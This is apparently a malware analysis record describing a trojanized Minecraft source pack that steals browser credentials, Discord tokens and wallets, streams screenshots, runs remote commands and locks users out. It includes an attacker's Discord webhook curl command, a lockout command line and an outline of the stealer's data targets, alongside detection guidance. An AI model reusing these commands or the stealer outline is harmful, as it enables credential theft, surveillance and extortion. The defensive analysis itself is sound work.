package_info.package_manager: WinRAR self-extract (Windows malware, not a package manager)
package_info.why_malicious: The package is a trojanized Minecraft source pack distributed as a WinRAR self-extracting archive. It contains multiple malicious scripts and binaries that steal sensitive information, exfiltrate data to attacker-controlled Discord webhooks and C2 servers, establish persistence, disable user defenses, and enable remote control and extortion.

malicious_snippets.code_snippet: curl -s --ssl-no-revoke -X POST -H "Content-type: application/json" --data "{\"content\": \"\n*** [⚠] USERNAME = SYSTEM LOCK X , VICTIM SEES AN ERROR ⚠***\"}" https://discord.com/api/webhooks/1117543783714787458/U_DdPjJm7rM7Q2asPiMISLTrbd3oGw3oVQ25_XU37HCmM6QIQ804SJAH4_h0AT2Vr_cv
malicious_snippets.code_behavior: When triggered by the attacker (via C2), the script sends a notification to a Discord webhook indicating the system is locked, alerting the attacker and enabling extortion or further action.

malice_analysis.why_suspicious: The code exfiltrates status information to an external Discord webhook, which is a common C2 and exfiltration method for malware.
malice_analysis.violated_expectations: Legitimate scripts should not send system lock status or error notifications to external webhooks, especially not Discord.
malice_analysis.similar_legitimate_use: Automated system monitoring tools may send alerts to webhooks, but never for malicious system locks or to attacker-controlled endpoints.
key_indicators: Use of Discord webhook for exfiltration

malicious_snippets.code_behavior: At runtime, the script repeatedly kills Task Manager to prevent the user from terminating malicious processes, ensuring persistence and impeding remediation.

malice_analysis.why_suspicious: Malware often disables system utilities like Task Manager to prevent detection and removal.
malice_analysis.violated_expectations: Legitimate software should not interfere with system management tools.
malice_analysis.similar_legitimate_use: Some parental control or kiosk software may restrict Task Manager, but not in this context.

execution_context.trigger: runtime (immediate after extraction, autorun at startup)

malicious_snippets.code_behavior: At runtime and on startup, the script captures a screenshot every five seconds and sends it to a Discord webhook, enabling continuous monitoring of the victim's activity.

malice_analysis.why_suspicious: Continuous screenshot exfiltration is a hallmark of surveillance malware.
malice_analysis.violated_expectations: Legitimate software should not capture and exfiltrate screenshots without user consent.
malice_analysis.similar_legitimate_use: Remote support tools may capture screens, but only with explicit user permission.

malicious_snippets.code_behavior: At runtime, the script downloads and executes remote commands from a C2 server, enabling full remote control of the victim's system.

malice_analysis.why_suspicious: Remote command execution from an external server is a core capability of RATs and is highly malicious.
malice_analysis.violated_expectations: Legitimate software should not execute arbitrary remote commands.
malice_analysis.similar_legitimate_use: Enterprise management tools may execute remote scripts, but only from trusted, authenticated sources.
key_indicators: C2 server hosted on free web hosting

execution_context.file_location: Main stealer binary (extracted from WinRAR SFX)

malicious_snippets.code_snippet: Copy browser data (Login Data, Cookies, History, Bookmarks) from Chrome, Opera, Brave, Vivaldi, Edge, Firefox profile paths; Copy Discord tokens from %appdata%\discord\Local Storage\leveldb; Copy Steam, osu!, Roblox, Growtopia, Discord data; Search Downloads for files with keywords (2fa, password, seed, etc.); Compress all into STEALER.zip; Exfiltrate via Discord webhook.
malicious_snippets.code_behavior: At runtime, the stealer collects sensitive data from browsers, games, and chat clients, searches for credentials and cryptocurrency wallets, compresses the data, and exfiltrates it to attacker-controlled Discord webhooks.

malice_analysis.why_suspicious: Bulk data theft and exfiltration to external servers is a primary indicator of infostealer malware.
malice_analysis.violated_expectations: Legitimate software should not access or exfiltrate user credentials, tokens, or sensitive files.
malice_analysis.similar_legitimate_use: Backup tools may access user data, but not exfiltrate it to untrusted endpoints.
key_indicators: Access to browser and application credential stores
Compression and exfiltration to Discord webhooks

malicious_snippets.code_snippet: msg * 'Do not restart your computer'; taskkill /f /im explorer.exe; start bsod.hta
malicious_snippets.code_behavior: On C2 command, the script displays a warning, kills the Windows Explorer shell, and launches a fullscreen blank window, effectively locking the user out of their system.

malice_analysis.why_suspicious: System lock and user interface disruption are common in ransomware and extortion attacks.
malice_analysis.violated_expectations: Legitimate software should not forcibly lock users out of their systems.
malice_analysis.similar_legitimate_use: Kiosk or parental control software may restrict access, but not in this deceptive manner.
key_indicators: Combined with Task Manager killer for lockout

attack_chain.action: User downloads and executes the trojanized Minecraft source pack (WinRAR SFX).
Malware performs anti-analysis checks (blacklist of usernames/processes).
attack_chain.leads_to: Conditional execution of stealer and dropped scripts

attack_chain.action: Stealer collects sensitive data from browsers, games, chat clients, and searches for credentials.
Collected data is compressed into STEALER.zip and exfiltrated to Discord webhooks.
Persistence established via registry autorun for key scripts (debugerkiller.bat, Screen.bat, RAT.bat).
Continuous screenshot capture and exfiltration to Discord webhook.
Remote commands executed via RAT.bat from C2 server.
On C2 command, system lock scripts are triggered, locking the user out and sending status to attacker.

behavioral_signatures: Batch scripts in ProgramData that kill Task Manager or Explorer.exe
Frequent screenshot capture and exfiltration to Discord webhooks
Bulk access to browser, game, and chat client credential stores
Compression and exfiltration of user data to external endpoints
Remote command execution via downloaded scripts from free web hosting
detection_knowledge.how_to_detect: Monitor for the creation and execution of suspicious batch and script files in C:\ProgramData, especially those that kill system processes or capture screenshots. Detect outbound connections to Discord webhooks and known C2 domains. Look for bulk access to browser and application credential stores, and the creation of compressed archives containing user data. Persistence via registry autorun for non-standard scripts is also a strong indicator.
